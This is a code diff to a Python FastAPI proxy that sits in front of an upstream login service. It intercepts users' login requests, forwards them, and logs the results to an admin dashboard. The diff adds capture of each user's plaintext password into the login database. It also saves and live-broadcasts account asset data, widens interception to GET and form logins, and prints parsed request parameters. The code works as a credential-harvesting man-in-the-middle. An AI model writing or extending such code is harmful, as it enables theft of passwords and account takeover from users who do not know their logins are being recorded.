@@ -24,7 +24,8 @@ from database import (
     init_db, record_login, get_all_users, get_all_ips, 
     get_recent_logins, get_user_detail, ban_user, unban_user,
     ban_ip, unban_ip, is_banned, get_ban_list, get_stats_summary,
-    save_user_assets, get_user_assets, get_all_user_assets, get_asset_history
+    save_user_assets, get_user_assets, get_all_user_assets, get_asset_history,
+    get_all_users_with_assets
 )
 
 # 配置
@@ -181,21 +182,80 @@ class AdminAuth(BaseModel):
     password: str
 
 # ===== 登录拦截代理 =====
-@app.post("/RPC/Login")
+@app.api_route("/RPC/Login", methods=["GET", "POST"])
 async def proxy_login(request: Request):
     """拦截登录请求，记录后转发到原始服务器"""
+    
+    print("\n" + "="*60)
+    print("[Login] ★★★ 拦截到登录请求 ★★★")
+    print("="*60)
     
     # 获取客户端信息
     client_ip = request.client.host
     user_agent = request.headers.get("user-agent", "")
+    content_type = request.headers.get("content-type", "")
     
-    # 获取请求体
-    try:
-        body = await request.json()
-    except:
-        body = {}
+    print(f"[Login] Method: {request.method}")
+    print(f"[Login] Content-Type: {content_type}")
+    print(f"[Login] Client IP: {client_ip}")
+    print(f"[Login] Query String: {request.url.query}")
     
-    account = body.get("account", "unknown")
+    # 解析请求参数（支持多种格式）
+    params = {}
+    
+    # 1. 先从 query string 获取
+    for key, value in request.query_params.items():
+        params[key] = value
+    print(f"[Login] Query Params: {dict(request.query_params)}")
+    
+    # 2. 从请求体获取
+    raw_body = None
+    if request.method == "POST":
+        try:
+            raw_body = await request.body()
+            print(f"[Login] Raw Body: {raw_body[:500] if raw_body else 'Empty'}")
+        except Exception as e:
+            print(f"[Login] 读取body失败: {e}")
+        
+        # 重新创建请求以便再次读取body
+        from starlette.requests import Request as StarletteRequest
+        
+        try:
+            if "application/json" in content_type:
+                body = json.loads(raw_body) if raw_body else {}
+                params.update(body)
+                print(f"[Login] 解析为JSON: {body}")
+            elif "application/x-www-form-urlencoded" in content_type:
+                # 解析 form-urlencoded
+                from urllib.parse import parse_qs
+                form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
+                for key, value in form_data.items():
+                    params[key] = value[0] if value else ''
+                print(f"[Login] 解析为Form: {params}")
+            else:
+                # 尝试解析为 JSON
+                try:
+                    body = json.loads(raw_body) if raw_body else {}
+                    params.update(body)
+                    print(f"[Login] 尝试JSON成功: {body}")
+                except:
+                    # 尝试解析为 form
+                    try:
+                        from urllib.parse import parse_qs
+                        form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
+                        for key, value in form_data.items():
+                            params[key] = value[0] if value else ''
+                        print(f"[Login] 尝试Form成功: {params}")
+                    except Exception as e:
+                        print(f"[Login] 解析失败: {e}")
+        except Exception as e:
+            print(f"[Login] 解析异常: {e}")
+    
+    account = params.get("account", "unknown")
+    password = params.get("password", "")
+    
+    print(f"[Login] ★ 最终解析结果: account={account}, password={'*'*len(password) if password else 'None'}")
+    print(f"[Login] ★ 所有参数keys: {list(params.keys())}")
     
     # 检查是否被封禁
     if is_banned(username=account, ip_address=client_ip):
@@ -204,38 +264,69 @@ async def proxy_login(request: Request):
             "Msg": "您的账号或IP已被封禁"
         })
     
-    # 转发请求到原始服务器
+    # 转发请求到原始服务器（保持原始格式）
     async with httpx.AsyncClient(verify=False, timeout=30) as client:
         try:
-            response = await client.post(
-                AKAPI_URL + "Login",
-                json=body,
-                headers={
-                    "User-Agent": user_agent,
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                }
-            )
+            # 构建转发请求
+            if "application/json" in content_type:
+                response = await client.post(
+                    AKAPI_URL + "Login",
+                    json=params,
+                    headers={"User-Agent": user_agent, "Content-Type": "application/json"}
+                )
+            else:
+                # 使用 form data 格式转发
+                response = await client.post(
+                    AKAPI_URL + "Login",
+                    data=params,
+                    headers={"User-Agent": user_agent}
+                )
             result = response.json()
+            print(f"[Login] 服务器响应: Error={result.get('Error')}, 有UserData={bool(result.get('UserData'))}")
         except Exception as e:
+            print(f"[Login] 请求失败: {e}")
             return JSONResponse({
                 "Error": True,
                 "Msg": f"服务器连接失败: {str(e)}"
             })
     
+    # 判断登录是否成功 - 检查Error字段
+    is_success = result.get("Error") == False or (not result.get("Error") and result.get("UserData"))
+    
+    status = "success" if is_success else "failed"
+    print(f"[Login] ★ 登录结果: is_success={is_success}, status={status}")
+    
+    # 如果登录成功，从 UserData 中提取用户资产信息
+    asset_data = None
+    if is_success and result.get("UserData"):
+        user_data = result["UserData"]
+        asset_data = user_data
+        print(f"[Login] ★ 保存用户资产: {account}")
+        try:
+            save_user_assets(account, user_data)
+            print(f"[Login] ★ 资产保存成功")
+        except Exception as e:
+            print(f"[Login] ★ 资产保存失败: {e}")
+    
     # 记录登录（无论成功失败）
-    status = "success" if not result.get("Error") else "failed"
-    record_login(
-        username=account,
-        ip_address=client_ip,
-        user_agent=user_agent,
-        request_path="/RPC/Login",
-        status_code=200 if not result.get("Error") else 401,
-        extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")})
-    )
+    print(f"[Login] ★ 记录登录: account={account}, is_success={is_success}")
+    try:
+        record_login(
+            username=account,
+            ip_address=client_ip,
+            user_agent=user_agent,
+            request_path="/RPC/Login",
+            status_code=200 if is_success else 401,
+            extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")}),
+            password=password,
+            is_success=is_success
+        )
+        print(f"[Login] ★ 登录记录保存成功")
+    except Exception as e:
+        print(f"[Login] ★ 登录记录保存失败: {e}")
     
     # 广播新登录事件
-    await manager.broadcast({
+    broadcast_data = {
         "type": "new_login",
         "data": {
             "username": account,
@@ -244,9 +335,37 @@ async def proxy_login(request: Request):
             "status": status,
             "user_agent": user_agent[:50] if user_agent else ""
         }
-    })
+    }
     
-    return JSONResponse(result)
+    # 如果有资产数据，一起广播
+    if asset_data:
+        broadcast_data["data"]["assets"] = {
+            "ep": asset_data.get("EP", 0),
+            "sp": asset_data.get("SP", 0),
+            "tp": asset_data.get("TP", 0),
+            "rp": asset_data.get("RP", 0),
+            "ace_count": asset_data.get("ACECount", 0),
+            "total_ace": asset_data.get("TotalACE", 0),
+            "honor_name": asset_data.get("HonorName", ""),
+            "weekly_money": asset_data.get("WeeklyMoney", 0)
+        }
+    
+    await manager.broadcast(broadcast_data)
+    
+    # 创建响应，如果登录成功则设置cookie保存用户名
+    response = JSONResponse(result)
+    if is_success:
+        # 设置cookie，聊天组件可以读取这个来获取用户名
+        response.set_cookie(
+            key="ak_username",
+            value=account,
+            max_age=86400 * 30,  # 30天
+            httponly=False,  # 允许JS读取
+            samesite="lax"
+        )
+        print(f"[Login] 登录成功，设置cookie: ak_username={account}")
+    
+    return response
 
 # ===== public_IndexData 拦截 (获取用户资产) =====
 @app.api_route("/RPC/public_IndexData", methods=["GET", "POST"])
@@ -284,27 +403,26 @@ async def proxy_index_data(request: Request):
                 "Msg": f"服务器连接失败: {str(e)}"
             })
     
-    # 如果成功获取数据，保存到数据库
+    # 如果成功获取数据，先保存到数据库再返回给客户端
     if not result.get("Error") and result.get("Data"):
         data = result["Data"]
         
-        # 尝试从最近的登录记录获取用户名
-        # 或者从请求中获取（如果有的话）
+        # 尝试从请求中获取用户名
         username = body.get("account") if body else None
         
         if not username:
-            # 从最近登录记录中查找该IP的用户
-            recent = get_recent_logins(limit=10)
+            # 从最近登录记录中查找该IP的用户（按时间倒序，取最近的）
+            recent = get_recent_logins(limit=20)
             for login in recent:
-                if login.get("ip_address") == client_ip:
+                if login.get("ip_address") == client_ip and login.get("username") != "unknown":
                     username = login.get("username")
                     break
         
         if username and username != "unknown":
-            # 保存用户资产信息
+            # 保存用户资产信息到数据库
             save_user_assets(username, data)
             
-            # 广播资产更新事件
+            # 广播资产更新事件（包含所有点数）
             await manager.broadcast({
                 "type": "asset_update",
                 "data": {
@@ -312,6 +430,9 @@ async def proxy_index_data(request: Request):
                     "ace_count": data.get("ACECount", 0),
                     "total_ace": data.get("TotalACE", 0),
                     "ep": data.get("EP", 0),
+                    "sp": data.get("SP", 0),
+                    "rp": data.get("RP", 0),
+                    "tp": data.get("TP", 0),
                     "weekly_money": data.get("WeeklyMoney", 0),
                     "rate": data.get("Rate", 0),
                     "honor_name": data.get("HonorName", ""),
@@ -319,6 +440,7 @@ async def proxy_index_data(request: Request):
                 }
             })
     
+    # 返回给客户端
     return JSONResponse(result)
 
 # ===== 其他RPC请求代理 =====
@@ -391,8 +513,8 @@ async def get_stats():
 
 @app.get("/admin/api/users")
 async def get_users(limit: int = 100, offset: int = 0):
-    """获取用户列表"""
-    return get_all_users(limit, offset)
+    """获取用户列表（包含资产信息）"""
+    return get_all_users_with_assets(limit, offset)
 
 @app.get("/admin/api/ips")
 async def get_ips(limit: int = 100, offset: int = 0):
